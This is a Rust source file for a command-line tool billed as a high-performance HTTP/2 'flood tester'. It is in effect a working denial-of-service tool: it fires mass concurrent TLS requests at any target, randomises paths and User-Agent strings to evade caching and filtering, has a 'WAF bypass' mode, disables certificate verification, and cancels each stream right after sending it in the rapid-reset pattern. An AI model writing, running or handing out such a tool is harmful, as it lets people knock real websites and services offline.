use clap::Parser;
use std::{
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
    time::{Duration, Instant},
};
use tokio::{net::TcpStream, time::sleep};
use tokio_rustls::{
    rustls::{
        self,
        client::{ServerCertVerified, ServerCertVerifier},
        Certificate, ClientConfig, OwnedTrustAnchor, RootCertStore, ServerName,
    },
    TlsConnector,
};
use h2::client;
use http::{Request, header::USER_AGENT, Method};
use rand::{seq::SliceRandom, Rng};
use indicatif::{ProgressBar, ProgressStyle};

#[derive(Parser, Debug)]
#[command(
author = "FloodTool Devs Xcroot",
version = "1.0.0",
about = "High-performance HTTP/2 flood tester with TLS and custom request options",
long_about = "A high-performance, customizable HTTP/2 flood testing tool. Supports TLS, randomized headers and paths, rate limiting, and concurrency."
)]
struct Args {
    #[arg(short, long, help = "Target domain or IP (e.g., example.com)")]
    target: String,

    #[arg(short, long, default_value_t = 443, help = "Target port (default: 443)")]
    port: u16,

    #[arg(short, long, default_value_t = 1000, help = "Total number of requests to send")]
    requests: usize,

    #[arg(long, default_value_t = 0, help = "Delay in milliseconds between requests (ignored if --rps is set)")]
    delay: u64,

    #[arg(long, default_value_t = 100, help = "Maximum concurrent connections")]
    max_concurrency: usize,

    #[arg(short, long, default_value = "/", help = "Base request path (e.g., /api, default is /)")]
    path: String,

    #[arg(long, default_value_t = false, help = "Enable random query strings (e.g., ?id=1234)")]
    randomize_path: bool,

    #[arg(long, default_value_t = false, help = "Randomize User-Agent headers")]
    random_user_agent: bool,

    #[arg(long, default_value_t = false, help = "Use WAF bypass technique (POST /admin)")]
    waf_bypass_headers: bool,

    #[arg(long, default_value_t = 0, help = "Requests per second rate limit (overrides delay)")]
    rps: u64,

    #[arg(long, default_value_t = 0, help = "Number of requests per burst")]
    burst: usize,

    #[arg(long, default_value_t = 0, help = "Interval between bursts in seconds")]
    burst_interval: u64,
}

fn print_banner() {
    let banner = r#"
    '||''|.   '||''|.   '||''|.
    ||   ||   ||   ||   ||   ||
    ||''|'    ||''|'    ||''|'
    ||   |.   ||   |.   ||   |.
    .||.  '|' .||.  '|' .||.  '|'
    "#;
    println!("\x1b[38;5;208m{banner}\x1b[0m");
}

fn get_random_user_agent() -> &'static str {
    let windows_chrome = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    ];
    let linux_firefox = [
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko Firefox/102.0",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox/115.0",
    ];
    let mac_chrome = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_0) AppleWebKit/605.1.15 Chrome/116.0 Safari/605.1.15",
    ];

    let all = [windows_chrome, linux_firefox, mac_chrome].concat();
    all.choose(&mut rand::thread_rng()).unwrap()
}

fn generate_random_path(base: &str) -> String {
    let rand_id: u32 = rand::thread_rng().gen_range(1000..9999);
    format!("{}?id={}", base, rand_id)
}

struct NoCertVerifier;
impl ServerCertVerifier for NoCertVerifier {
    fn verify_server_cert(
        &self,
        _: &Certificate,
        _: &[Certificate],
        _: &ServerName,
        _: &mut dyn Iterator<Item = &[u8]>,
        _: &[u8],
        _: std::time::SystemTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
}

#[tokio::main]
async fn main() {
    print_banner();
    let args = Args::parse();

    let bar = ProgressBar::new(args.requests as u64);
    bar.set_style(
        ProgressStyle::default_bar()
        .template("[{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} sent")
        .unwrap(),
    );

    let sent = Arc::new(AtomicUsize::new(0));
    let success = Arc::new(AtomicUsize::new(0));
    let errors = Arc::new(AtomicUsize::new(0));

    let addr = format!("{}:{}", args.target, args.port);

    let mut root_store = RootCertStore::empty();
    root_store.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
        OwnedTrustAnchor::from_subject_spki_name_constraints(
            ta.subject,
            ta.spki,
            ta.name_constraints,
        )
    }));

    let mut config = ClientConfig::builder()
    .with_safe_defaults()
    .with_root_certificates(root_store)
    .with_no_client_auth();

    config.dangerous().set_certificate_verifier(Arc::new(NoCertVerifier));
    let connector = TlsConnector::from(Arc::new(config));
    let chunk = (args.requests + args.max_concurrency - 1) / args.max_concurrency;

    let mut handles = vec![];

    for _ in 0..args.max_concurrency {
        let connector = connector.clone();
        let target = args.target.clone();
        let path = args.path.clone();
        let addr = addr.clone();
        let sent = sent.clone();
        let success = success.clone();
        let errors = errors.clone();
        let bar = bar.clone();
        let random_path = args.randomize_path;
        let random_agent = args.random_user_agent;
        let waf_headers = args.waf_bypass_headers;
        let rps = args.rps;
        let delay = args.delay;
        let burst = args.burst;
        let burst_interval = args.burst_interval;

        let handle = tokio::spawn(async move {
            let mut last_burst = Instant::now();

            for _ in 0..chunk {
                if sent.load(Ordering::Relaxed) >= args.requests {
                    break;
                }

                if burst > 0 && burst_interval > 0 {
                    if last_burst.elapsed() >= Duration::from_secs(burst_interval) {
                        for _ in 0..burst {
                            fire(
                                &connector, &addr, &target, &path,
                                 random_path, random_agent, waf_headers,
                                 &sent, &success, &errors, &bar,
                            ).await;
                        }
                        last_burst = Instant::now();
                        continue;
                    }
                } else if rps > 0 {
                    sleep(Duration::from_millis(1000 / rps)).await;
                } else if delay > 0 {
                    sleep(Duration::from_millis(delay)).await;
                }

                fire(
                    &connector, &addr, &target, &path,
                     random_path, random_agent, waf_headers,
                     &sent, &success, &errors, &bar,
                ).await;
            }
        });

        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }

    bar.finish_with_message("Completed");

    println!(
        "\nResults:\n  Sent: {}\n  Success: {}\n  Errors: {}",
        sent.load(Ordering::Relaxed),
             success.load(Ordering::Relaxed),
             errors.load(Ordering::Relaxed)
    );
}

async fn fire(
    connector: &TlsConnector,
    addr: &str,
    target: &str,
    path: &str,
    random_path: bool,
    random_agent: bool,
    waf_headers: bool,
    sent: &AtomicUsize,
    success: &AtomicUsize,
    errors: &AtomicUsize,
    bar: &ProgressBar,
) {
    if let Ok(stream) = TcpStream::connect(addr).await {
        let domain = match ServerName::try_from(target) {
            Ok(d) => d,
            Err(_) => {
                errors.fetch_add(1, Ordering::Relaxed);
                sent.fetch_add(1, Ordering::Relaxed);
                bar.inc(1);
                return;
            }
        };

        if let Ok(tls) = connector.connect(domain, stream).await {
            if let Ok((mut client, connection)) = client::handshake(tls).await {
                tokio::spawn(async move {
                    let _ = connection.await;
                });

                let uri_path = if waf_headers {
                    "/admin".to_string()
                } else if random_path {
                    generate_random_path(path)
                } else {
                    path.to_string()
                };

                let mut req_builder = Request::builder()
                .method(if waf_headers { Method::POST } else { Method::GET })
                .uri(uri_path);

                if random_agent {
                    req_builder = req_builder.header(USER_AGENT, get_random_user_agent());
                }

                let req = match req_builder.body(()) {
                    Ok(r) => r,
                    Err(_) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                        sent.fetch_add(1, Ordering::Relaxed);
                        bar.inc(1);
                        return;
                    }
                };

                match client.send_request(req, false) {
                    Ok((_resp, mut send_stream)) => {
                        let _ = send_stream.send_reset(h2::Reason::CANCEL);
                        success.fetch_add(1, Ordering::Relaxed);
                    }
                    Err(_) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        }
    }

    sent.fetch_add(1, Ordering::Relaxed);
    bar.inc(1);
}
